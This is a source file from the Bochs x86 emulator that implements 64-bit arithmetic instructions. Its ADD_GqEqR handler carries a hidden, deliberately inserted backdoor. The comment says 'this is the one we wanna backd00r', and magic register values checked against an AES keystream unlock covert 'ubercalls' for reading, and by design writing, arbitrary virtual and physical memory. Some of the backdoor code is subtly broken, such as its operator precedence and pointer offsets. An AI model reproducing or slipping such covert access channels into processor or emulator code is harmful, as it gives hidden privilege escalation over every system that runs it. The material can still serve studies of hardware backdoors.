/////////////////////////////////////////////////////////////////////////
// $Id: arith64.cc 11766 2013-08-04 19:37:04Z sshwarts $
/////////////////////////////////////////////////////////////////////////
//
//  Copyright (C) 2001-2012  The Bochs Project
//
//  This library is free software; you can redistribute it and/or
//  modify it under the terms of the GNU Lesser General Public
//  License as published by the Free Software Foundation; either
//  version 2 of the License, or (at your option) any later version.
//
//  This library is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
//  Lesser General Public License for more details.
//
//  You should have received a copy of the GNU Lesser General Public
//  License along with this library; if not, write to the Free Software
//  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA B 02110-1301 USA
/////////////////////////////////////////////////////////////////////////

#define NEED_CPU_REG_SHORTCUTS 1
#include "bochs.h"
#include "cpu.h"
#define LOG_THIS BX_CPU_THIS_PTR

#if BX_SUPPORT_X86_64

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_EqGqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = BX_READ_64BIT_REG(i->src());
  sum_64 = op1_64 + op2_64;
  write_RMW_virtual_qword(sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
{ // this is the one we wanna backd00r
  Bit64u op1_64, op2_64, sum_64;
  uint8_t error = 1;
  uint8_t data = 0xcc;
  uint8_t keystream [16];

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = BX_READ_64BIT_REG(i->src());
  sum_64 = op1_64 + op2_64;

  /* Übercall calling convention:
     authentication:
     RAX = 0x99a0086fba28dfd1
     RBX = 0xe2dd84b5c9688a03

     arguments:
     RCX = ubercall number
     RDX = argument 1 (usually an address)
     RSI = argument 2 (usually a value)

     testing only:
     RDI = return value
     RBP = error indicator (1 iff an error occured)
     ^^^^^ testing only ^^^^^

     ubercall numbers:
     RCX = 0xabadbabe00000001 is PEEK to a virtual address 
        return *(uint8_t *) RDX
     RCX = 0xabadbabe00000002 is POKE to a virtual address
        *(uint8_t *) RDX = RSI
     if the page table walk fails, we don't generate any kind of fault or
     exception, we just write 1 to the error indicator field.

     the page table that is used is the one that is used when the current
     process accesses memory

     RCX = 0xabadbabe00000003 is PEEK to a physical address 
        return *(uint8_t *) RDX
     RCX = 0xabadbabe00000004 is POKE to a physical address
        *(uint8_t *) RDX = RSI

     (we only read/write 1 byte at a time because anything else could
     involve alignment issues and/or access that cross page boundaries)
     */

  ctr_output(keystream);
  if ((RAX ^ *((uint64_t *) keystream)     == 0x99a0086fba28dfd1) &&
      (RBX ^ *((uint64_t *) keystream + 8) == 0xe2dd84b5c9688a03)) {
      // we have a valid ubercall, let's do this texas-style
      BX_CPU_THIS_PTR evil.i_counter++;
      ctr_output(keystream);

      switch (RCX ^ *((uint64_t *) keystream)) {
          case 0xabadbabe00000001: // peek, virtual
              access_read_linear_nofail(RDX ^ *((uint64_t *) keystream + 8), 1, 0, BX_READ, (void *) &data, &error);
              BX_CPU_THIS_PTR evil.evilbyte = data;
              BX_CPU_THIS_PTR evil.evilstatus = error;
              break;
      }
      BX_CPU_THIS_PTR evil.out_stat = 0; /* we start at the hi half of the
                                            output block now */
  }

  BX_WRITE_64BIT_REG(i->dst(), sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

void BX_CPU_C::ctr_output(uint8_t *out) {
    uint8_t ibuf [16];

    AES_KEY keyctx;
    AES_set_encrypt_key(BX_CPU_THIS_PTR evil.aes_key, 128, &keyctx);

    memset(ibuf, 0xef, 16);
    memcpy(ibuf, &(BX_CPU_THIS_PTR evil.i_counter), 8);
    AES_encrypt(ibuf, out, &keyctx);
}



BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = read_virtual_qword_64(i->seg(), eaddr);
  sum_64 = op1_64 + op2_64;
  BX_WRITE_64BIT_REG(i->dst(), sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADC_EqGqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = BX_READ_64BIT_REG(i->src());
  sum_64 = op1_64 + op2_64 + getB_CF();
  write_RMW_virtual_qword(sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADC_GqEqR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = BX_READ_64BIT_REG(i->src());
  sum_64 = op1_64 + op2_64 + getB_CF();

  BX_WRITE_64BIT_REG(i->dst(), sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADC_GqEqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = read_virtual_qword_64(i->seg(), eaddr);
  sum_64 = op1_64 + op2_64 + getB_CF();

  BX_WRITE_64BIT_REG(i->dst(), sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SBB_EqGqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = BX_READ_64BIT_REG(i->src());
  diff_64 = op1_64 - (op2_64 + getB_CF());
  write_RMW_virtual_qword(diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SBB_GqEqR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = BX_READ_64BIT_REG(i->src());
  diff_64 = op1_64 - (op2_64 + getB_CF());

  BX_WRITE_64BIT_REG(i->dst(), diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SBB_GqEqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = read_virtual_qword_64(i->seg(), eaddr);
  diff_64 = op1_64 - (op2_64 + getB_CF());

  BX_WRITE_64BIT_REG(i->dst(), diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SBB_EqIdM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = (Bit32s) i->Id();
  diff_64 = op1_64 - (op2_64 + getB_CF());
  write_RMW_virtual_qword(diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SBB_EqIdR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = (Bit32s) i->Id();
  diff_64 = op1_64 - (op2_64 + getB_CF());
  BX_WRITE_64BIT_REG(i->dst(), diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SUB_EqGqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = BX_READ_64BIT_REG(i->src());
  diff_64 = op1_64 - op2_64;
  write_RMW_virtual_qword(diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SUB_GqEqR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = BX_READ_64BIT_REG(i->src());
  diff_64 = op1_64 - op2_64;

  BX_WRITE_64BIT_REG(i->dst(), diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SUB_GqEqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = read_virtual_qword_64(i->seg(), eaddr);
  diff_64 = op1_64 - op2_64;

  BX_WRITE_64BIT_REG(i->dst(), diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CMP_EqGqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  op1_64 = read_virtual_qword_64(i->seg(), eaddr);
  op2_64 = BX_READ_64BIT_REG(i->src());
  diff_64 = op1_64 - op2_64;

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CMP_GqEqR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = BX_READ_64BIT_REG(i->src());
  diff_64 = op1_64 - op2_64;

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CMP_GqEqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = read_virtual_qword_64(i->seg(), eaddr);
  diff_64 = op1_64 - op2_64;

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CDQE(bxInstruction_c *i)
{
  /* CWDE: no flags are affected */
  RAX = (Bit32s) EAX;

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CQO(bxInstruction_c *i)
{
  /* CQO: no flags are affected */

  if (RAX & BX_CONST64(0x8000000000000000))
      RDX = BX_CONST64(0xffffffffffffffff);
  else
      RDX = 0;

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::XADD_EqGqM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  /* XADD dst(r/m), src(r)
   * temp <-- src + dst         | sum = op2 + op1
   * src  <-- dst               | op2 = op1
   * dst  <-- tmp               | op1 = sum
   */

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = BX_READ_64BIT_REG(i->src());
  sum_64 = op1_64 + op2_64;
  write_RMW_virtual_qword(sum_64);

  /* and write destination into source */
  BX_WRITE_64BIT_REG(i->src(), op1_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::XADD_EqGqR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  /* XADD dst(r/m), src(r)
   * temp <-- src + dst         | sum = op2 + op1
   * src  <-- dst               | op2 = op1
   * dst  <-- tmp               | op1 = sum
   */

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = BX_READ_64BIT_REG(i->src());
  sum_64 = op1_64 + op2_64;

  // and write destination into source
  // Note: if both op1 & op2 are registers, the last one written
  //       should be the sum, as op1 & op2 may be the same register.
  //       For example:  XADD AL, AL
  BX_WRITE_64BIT_REG(i->src(), op1_64);
  BX_WRITE_64BIT_REG(i->dst(), sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_EqIdM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = (Bit32s) i->Id();
  sum_64 = op1_64 + op2_64;
  write_RMW_virtual_qword(sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_EqIdR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = (Bit32s) i->Id();
  sum_64 = op1_64 + op2_64;
  BX_WRITE_64BIT_REG(i->dst(), sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADC_EqIdM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = (Bit32s) i->Id();
  sum_64 = op1_64 + op2_64 + getB_CF();
  write_RMW_virtual_qword(sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADC_EqIdR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, sum_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = (Bit32s) i->Id();
  sum_64 = op1_64 + op2_64 + getB_CF();
  BX_WRITE_64BIT_REG(i->dst(), sum_64);

  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SUB_EqIdM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  /* pointer, segment address pair */
  op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op2_64 = (Bit32s) i->Id();
  diff_64 = op1_64 - op2_64;
  write_RMW_virtual_qword(diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::SUB_EqIdR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = (Bit32s) i->Id();
  diff_64 = op1_64 - op2_64;
  BX_WRITE_64BIT_REG(i->dst(), diff_64);

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CMP_EqIdM(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  op1_64 = read_virtual_qword_64(i->seg(), eaddr);
  op2_64 = (Bit32s) i->Id();
  diff_64 = op1_64 - op2_64;

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CMP_EqIdR(bxInstruction_c *i)
{
  Bit64u op1_64, op2_64, diff_64;

  op1_64 = BX_READ_64BIT_REG(i->dst());
  op2_64 = (Bit32s) i->Id();
  diff_64 = op1_64 - op2_64;

  SET_FLAGS_OSZAPC_SUB_64(op1_64, op2_64, diff_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::NEG_EqM(bxInstruction_c *i)
{
  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  Bit64u op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op1_64 = - (Bit64s)(op1_64);
  write_RMW_virtual_qword(op1_64);

  SET_FLAGS_OSZAPC_SUB_64(0, -op1_64, op1_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::NEG_EqR(bxInstruction_c *i)
{
  Bit64u op1_64 = BX_READ_64BIT_REG(i->dst());
  op1_64 = - (Bit64s)(op1_64);
  BX_WRITE_64BIT_REG(i->dst(), op1_64);

  SET_FLAGS_OSZAPC_SUB_64(0, -op1_64, op1_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::INC_EqM(bxInstruction_c *i)
{
  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  Bit64u op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op1_64++;
  write_RMW_virtual_qword(op1_64);

  SET_FLAGS_OSZAP_ADD_64(op1_64 - 1, 0, op1_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::INC_EqR(bxInstruction_c *i)
{
  Bit64u rrx = ++BX_READ_64BIT_REG(i->dst());
  SET_FLAGS_OSZAP_ADD_64(rrx - 1, 0, rrx);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::DEC_EqM(bxInstruction_c *i)
{
  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  Bit64u op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  op1_64--;
  write_RMW_virtual_qword(op1_64);

  SET_FLAGS_OSZAP_SUB_64(op1_64 + 1, 0, op1_64);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::DEC_EqR(bxInstruction_c *i)
{
  Bit64u rrx = --BX_READ_64BIT_REG(i->dst());
  SET_FLAGS_OSZAP_SUB_64(rrx + 1, 0, rrx);

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CMPXCHG_EqGqM(bxInstruction_c *i)
{
  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  Bit64u op1_64 = read_RMW_virtual_qword_64(i->seg(), eaddr);
  Bit64u diff_64 = RAX - op1_64;
  SET_FLAGS_OSZAPC_SUB_64(RAX, op1_64, diff_64);

  if (diff_64 == 0) {  // if accumulator == dest
    // dest <-- src
    write_RMW_virtual_qword(BX_READ_64BIT_REG(i->src()));
  }
  else {
    // accumulator <-- dest
    write_RMW_virtual_qword(op1_64);
    RAX = op1_64;
  }

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CMPXCHG_EqGqR(bxInstruction_c *i)
{
  Bit64u op1_64 = BX_READ_64BIT_REG(i->dst());
  Bit64u diff_64 = RAX - op1_64;
  SET_FLAGS_OSZAPC_SUB_64(RAX, op1_64, diff_64);

  if (diff_64 == 0) {  // if accumulator == dest
    // dest <-- src
    BX_WRITE_64BIT_REG(i->dst(), BX_READ_64BIT_REG(i->src()));
  }
  else {
    // accumulator <-- dest
    RAX = op1_64;
  }

  BX_NEXT_INSTR(i);
}

BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::CMPXCHG16B(bxInstruction_c *i)
{
  bx_address eaddr = BX_CPU_CALL_METHODR(i->ResolveModrm, (i));

  Bit64u op1_64_lo, op1_64_hi, diff;

  // check write permission for following write
  read_RMW_virtual_dqword_aligned_64(i->seg(), eaddr, &op1_64_hi, &op1_64_lo);

  diff  = RAX - op1_64_lo;
  diff |= RDX - op1_64_hi;

  if (diff == 0) {  // if accumulator == dest
    write_RMW_virtual_dqword(RCX, RBX);
    assert_ZF();
  }
  else {
    clear_ZF();
    write_RMW_virtual_dqword(op1_64_hi, op1_64_lo);
    // accumulator <-- dest
    RAX = op1_64_lo;
    RDX = op1_64_hi;
  }

  BX_NEXT_INSTR(i);
}

#endif /* if BX_SUPPORT_X86_64 */
